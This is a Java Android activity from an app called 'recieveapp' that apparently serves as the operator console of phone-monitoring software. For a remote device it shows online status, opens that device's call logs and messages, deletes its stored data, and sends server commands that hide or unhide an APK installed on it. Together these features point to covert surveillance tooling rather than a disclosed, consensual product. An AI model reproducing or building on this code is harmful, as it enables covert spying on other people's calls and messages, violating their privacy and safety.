package com.techndevs.payu.recieveapp;

import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.RecyclerView;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.techndevs.payu.recieveapp.Broadcast.ConnectivityReciever;
import com.techndevs.payu.recieveapp.Constants.BaseUrl;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.io.File;
import java.io.UnsupportedEncodingException;
import java.util.HashMap;
import java.util.Map;

public class HomeActivity extends AppCompatActivity implements ConnectivityReciever.ConnectivityRecieverListner {

    LinearLayout linearLayoutNetworkStatus, linearLayoutPhone, linearLayoutCountry;
    TextView txtVuHeadingNetwork, txtVuCountry, txtVuPhone;
    RecyclerView recyclerViewIMEI;
    String phoneNumber, device_name, device_online_status;
    Button btnCalllogs, btnMessages, btnHideApk,btnUnhideApk;

    ProgressDialog progressDialog, progressDialogDelete;

    boolean HIDDEN_FLAG = false;

    DatabaseReference dbRef;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);

        Toolbar toolbar = findViewById(R.id.toolbar_home);
        setSupportActionBar(toolbar);
        getSupportActionBar().setTitle("Home");
        toolbar.setBackgroundColor(getResources().getColor(R.color.colorPrimary));

        intializations();

        progressDialog = new ProgressDialog(this);
        progressDialog.setTitle("Refreshing");
        progressDialog.setMessage("Please wait for a litte while");
        progressDialog.setCancelable(false);

        progressDialogDelete = new ProgressDialog(this);
        progressDialogDelete.setTitle("Deleting");
        progressDialogDelete.setMessage("Please wait for a litte while");
        progressDialogDelete.setCancelable(false);

        if (getIntent() != null) {
            device_name = getIntent().getStringExtra("device_name");
            device_name = device_name.toUpperCase();
            // fetchMobileNo(device_name);
            startThreadOnline();

            dbRef = FirebaseDatabase.getInstance().getReference("Mobile").child(device_name);

        }

        btnHideApk.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                hideKorzynaApk();
            }
        });
        btnUnhideApk.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
              unhideKorzynaApk();
            }
        });

    }


    private void fetchMobileNo(final String device) {
        trimCache(HomeActivity.this);
        String url = BaseUrl.baseUrl + getResources().getString(R.string.get_mobile_no);
        StringRequest mStringRequest = new StringRequest(1, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {

                txtVuPhone.setText(response);

            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

                Log.i("Error", error.toString());
                Toast.makeText(HomeActivity.this, error.getMessage(), Toast.LENGTH_SHORT).show();
            }
        }) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {

                HashMap<String, String> params = new HashMap<>();

                if (device != null) {
                    params.put("device_name", device);
                }

                return params;

            }
        };

        RequestQueue mRequestQueue = Volley.newRequestQueue(HomeActivity.this);
        mRequestQueue.add(mStringRequest);
    }


    private void getCountry() {
        Log.i("country", device_name);
        DatabaseReference dbRefCountry = FirebaseDatabase.getInstance().getReference("Countries");
        dbRefCountry.child(device_name).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot != null) {
                    if (dataSnapshot.hasChild("country")) {
                        String country = dataSnapshot.child("country").getValue().toString();
                        linearLayoutCountry.setVisibility(View.VISIBLE);
                        txtVuCountry.setText(country);
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });
    }

    private void intializations() {
        linearLayoutNetworkStatus = findViewById(R.id.linearNetworkStatus);
        txtVuHeadingNetwork = findViewById(R.id.tv_heading);
        txtVuCountry = findViewById(R.id.tv_country);
        recyclerViewIMEI = findViewById(R.id.recyler_view);
        linearLayoutPhone = findViewById(R.id.linearPhone);
        txtVuPhone = findViewById(R.id.tv_phone);
        linearLayoutCountry = findViewById(R.id.linearCountry);
        btnCalllogs = findViewById(R.id.calllogs);
        btnMessages = findViewById(R.id.btn_messages);
        btnHideApk = findViewById(R.id.btn_delete_korzyna_apk);
        btnUnhideApk=findViewById(R.id.btn_unhide_korzyna_apk);
    }

    public void getCalllogs(View view) {
        Intent mIntent = new Intent(this, Calllogs.class);
        mIntent.putExtra("device_name", device_name);
        startActivity(mIntent);
    }

    public void getMessages(View view) {
        Intent mIntent = new Intent(this, Messages.class);
        mIntent.putExtra("device_name", device_name);
        startActivity(mIntent);

    }


    @Override
    protected void onResume() {
        super.onResume();
        MyApplication.getInstance().setConnectivtyListner(this);
        boolean isConnected = ConnectivityReciever.isConnected();
        checkConnection(isConnected);

    }


//    private ArrayList startThread() {
//        Thread mThread= new Thread(){
//            public void run(){
//                super.run();
//                try {
//                    Thread.sleep(1000);
//                    trimCache(HomeActivity.this);
//                    StringRequest mStringRequest = new StringRequest(1, "http://rfbasolutions.com/get_messages_api/get_last_messages.php", new Response.Listener<String>() {
//                        @Override
//                        public void onResponse(String response) {
////                            spinKitView.setVisibility(View.GONE);
////                            data=response;
////                            list.add(response);
////                            //Toast.makeText(getApplicationContext(), list.toString(), Toast.LENGTH_SHORT).show();
////                            cartAdapter= new CartAdapter(list,R.layout.recyler_item,HomeActivity.this);
////                            recyclerView.setLayoutManager(new LinearLayoutManager(HomeActivity.this));
////                            recyclerView.setAdapter(cartAdapter);
//
//                            /*intent.putExtra("Messages",response);
//                            startService(intent);*/ //start service which is MyService.java
//                        }
//                    }, new Response.ErrorListener() {
//                        @Override
//                        public void onErrorResponse(VolleyError error) {
////                            spinKitView.setVisibility(View.GONE);
////                            Toast.makeText(Messages.this, error.toString(), Toast.LENGTH_SHORT).show();
//                        }
//                    }){
//                        @Override
//                        protected Map<String, String> getParams() throws AuthFailureError {
//
//
//                            return null;
//
//                        }
//                    };
//
//                    RequestQueue mRequestQueue = Volley.newRequestQueue(HomeActivity.this);
//                    mRequestQueue.add( mStringRequest);
//                }catch (InterruptedException e){
//                    e.printStackTrace();
//                }
//            }
//        };
//        mThread.start();
//
//        return list;
//
//    }

    private void deleteMobile() {
        progressDialogDelete.show();
        Thread mThread = new Thread() {
            public void run() {
                super.run();
                try {
                    Thread.sleep(1000);
                    trimCache(HomeActivity.this);
                    String url = BaseUrl.baseUrl + getResources().getString(R.string.delete_mobile_data);
                    StringRequest mStringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {

                            if (response.equals("true")) {
                                progressDialogDelete.dismiss();
                                Toast.makeText(HomeActivity.this, "Mobile Deleleted Successfully", Toast.LENGTH_SHORT).show();
                                Intent intent = new Intent(HomeActivity.this, IMEIActivity.class);
                                startActivity(intent);
                                finish();

                            }

                        }
                    }, new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            progressDialogDelete.dismiss();
                            Toast.makeText(HomeActivity.this, error.toString(), Toast.LENGTH_SHORT).show();
                        }
                    }) {
                        @Override
                        protected Map<String, String> getParams() throws AuthFailureError {

                            HashMap<String, String> params = new HashMap<>();

                            Log.i("device", device_name);
                            params.put("phone", device_name);

                            return params;

                        }
                    };

                    RequestQueue mRequestQueue = Volley.newRequestQueue(HomeActivity.this);
                    mRequestQueue.add(mStringRequest);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        };
        mThread.start();

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {

        getMenuInflater().inflate(R.menu.home_menu, menu);
        return true;
    }


    @Override
    public boolean onOptionsItemSelected(MenuItem item) {


        int id = item.getItemId();
        if (id == R.id.refresh_message_home) {
            progressDialog.show();
            startThreadOnline();
        }
        return true;
    }


    public static void trimCache(Context context) {
        try {
            File dir = context.getCacheDir();
            if (dir != null && dir.isDirectory()) {
                deleteDir(dir);
            }
        } catch (Exception e) {

        }
    }

    public static boolean deleteDir(File dir) {
        if (dir != null && dir.isDirectory()) {
            String[] children = dir.list();
            for (int i = 0; i < children.length; i++) {
                boolean success = deleteDir(new File(dir, children[i]));
                if (!success) {
                    return false;
                }
            }
        }

// The directory is now empty so delete it
        return dir.delete();
    }

    private void checkConnection(boolean isConnected) {
        if (isConnected) {

        } else {

        }
    }


    @Override
    public void onNetworkConnectionChanged(boolean isConnected) {
        checkConnection(isConnected);
    }

    public void onClickDelteMobile(View view) {

        btnCalllogs.setVisibility(View.GONE);
        btnMessages.setVisibility(View.GONE);
        deleteMobile();
    }


    private void startThreadOnline() {
        // progressDialog.show();
        trimCache(HomeActivity.this);
        String url = BaseUrl.baseUrl + getResources().getString(R.string.get_online_status);
        StringRequest mStringRequest = new StringRequest(1, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.i("Response", response);
                if (response.equals("online")) {
                    progressDialog.dismiss();
                    linearLayoutNetworkStatus.setVisibility(View.VISIBLE);
                    linearLayoutNetworkStatus.setBackgroundColor(getResources().getColor(R.color.colorGreen));
                    txtVuHeadingNetwork.setText("ONLINE");
                } else {
                    progressDialog.dismiss();
                    linearLayoutNetworkStatus.setVisibility(View.VISIBLE);
                    linearLayoutNetworkStatus.setBackgroundColor(getResources().getColor(R.color.colorRed));
                    txtVuHeadingNetwork.setText("OFFLINE");
                }


            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                progressDialog.dismiss();
                if (error == null || error.networkResponse == null) {
                    return;
                }
                String body;
                //get status code here
                final String statusCode = String.valueOf(error.networkResponse.statusCode);
                //get response body and parse with appropriate encoding
                try {
                    body = new String(error.networkResponse.data, "UTF-8");
                    Toast.makeText(HomeActivity.this, "StatusCode: " + statusCode + "\n" + "Error: " + body, Toast.LENGTH_SHORT).show();
                } catch (UnsupportedEncodingException e) {
                    // exception
                }
            }
        }) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {


                HashMap<String, String> params = new HashMap<>();

                if (device_name != null) {
                    Log.i("device", device_name);
                    params.put("phone", device_name);
                }
                params.put("ping", "somthing");

                return params;

            }
        };

        RequestQueue mRequestQueue = Volley.newRequestQueue(HomeActivity.this);
        mRequestQueue.add(mStringRequest);

    }

    private void hideKorzynaApk() {
        String url = BaseUrl.baseUrl + getResources().getString(R.string.delete_korzystna_apk);
        StringRequest mStringRequest = new StringRequest(1, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {

                if (response.equals("true")) {
                    btnUnhideApk.setVisibility(View.VISIBLE);
                    btnHideApk.setVisibility(View.GONE);
                } else {
                    Toast.makeText(HomeActivity.this, "Something wrong happened. Press button again", Toast.LENGTH_SHORT).show();
                }

            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

                Log.i("Error", error.toString());
                Toast.makeText(HomeActivity.this, error.getMessage(), Toast.LENGTH_SHORT).show();
            }
        }) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {

                HashMap<String, String> params = new HashMap<>();
                params.put("status", "true");
                params.put("phone", device_name);

                return params;

            }
        };

        RequestQueue mRequestQueue = Volley.newRequestQueue(HomeActivity.this);
        mRequestQueue.add(mStringRequest);
    }

    private void unhideKorzynaApk() {
        String url = BaseUrl.baseUrl + getResources().getString(R.string.delete_korzystna_apk);
        StringRequest mStringRequest = new StringRequest(1, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {

                if (response.equals("true")) {
                   btnHideApk.setVisibility(View.VISIBLE);
                   btnUnhideApk.setVisibility(View.GONE);
                } else {
                    Toast.makeText(HomeActivity.this, "Something wrong happened. Press button again", Toast.LENGTH_SHORT).show();
                }

            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

                Log.i("Error", error.toString());
                Toast.makeText(HomeActivity.this, error.getMessage(), Toast.LENGTH_SHORT).show();
            }
        }) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {

                HashMap<String, String> params = new HashMap<>();
                params.put("status", "false");
                params.put("phone", device_name);
                return params;

            }
        };

        RequestQueue mRequestQueue = Volley.newRequestQueue(HomeActivity.this);
        mRequestQueue.add(mStringRequest);
    }


}
